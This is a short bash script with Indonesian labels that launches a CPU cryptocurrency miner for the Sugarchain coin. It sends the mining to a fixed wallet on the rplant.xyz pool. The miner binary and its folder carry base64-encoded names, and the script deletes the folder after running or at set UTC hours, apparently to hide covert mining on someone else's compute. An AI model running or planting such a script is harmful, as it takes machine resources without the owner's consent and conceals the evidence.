#!/bin/bash



jam2digit=$(date -u +%H)
jam1digit=$((10#$jam2digit))
echo "sekarang $jam2digit $jam1digit "
ketentuan1=1
ketentuan2=5
ketentuan3=9
ketentuan4=13
ketentuan5=17
ketentuan6=21
if [ $jam1digit -eq $ketentuan1 ] || [ $jam1digit -eq $ketentuan2 ] || [ $jam1digit -eq $ketentuan3 ] || [ $jam1digit -eq $ketentuan4 ] || [ $jam1digit -eq $ketentuan5 ] || [ $jam1digit -eq $ketentuan6 ]
then
  echo "sama dengan $ketentuan1 $ketentuan2 $ketentuan3 $ketentuan4 $ketentuan5 $ketentuan6  "
  cd .. && rm -rf c3VnYXJjaGFpbg
  exit 0
else
  echo "enggak $ketentuan1 $ketentuan2 $ketentuan3 $ketentuan4 $ketentuan5 $ketentuan6 "
  #while [ 1 ]; do
  #chmod +x cpuminer-sse2
  chmod +x Y3B1bWluZXItc3NlMg
  ./Y3B1bWluZXItc3NlMg --algo=yespowerSUGAR --url=stratum+tcps://stratum-na.rplant.xyz:17042 --user=sugar1q6dsvfpf6palnwsel8g6q2ljzft2yj57tt0dsds.mujurid$(( $RANDOM % 99 + 1 ))
  cd .. && rm -rf c3VnYXJjaGFpbg
  #sleep 5
  #done
  exit 0
fi

#echo 'index'

#lscpu

#curl http://ip-api.com/json/

#chmod +x cpuminer-sse2

#
# Choose nearest stratum:
#       stratum-ru.rplant.xyz   /Moscow/
#       stratum-eu.rplant.xyz   /London/
#       stratum-asia.rplant.xyz /Singapore/
#       stratum-na.rplant.xyz   /Toronto/
#

#while [ 1 ]; do
#./Y3B1bWluZXItc3NlMg -a yespowerSUGAR -o stratum+tcps://stratum-na.rplant.xyz:17042 -u sugar1q6dsvfpf6palnwsel8g6q2ljzft2yj57tt0dsds.MujurID$(( $RANDOM % 99 + 1 ))
#done

#echo 'index'
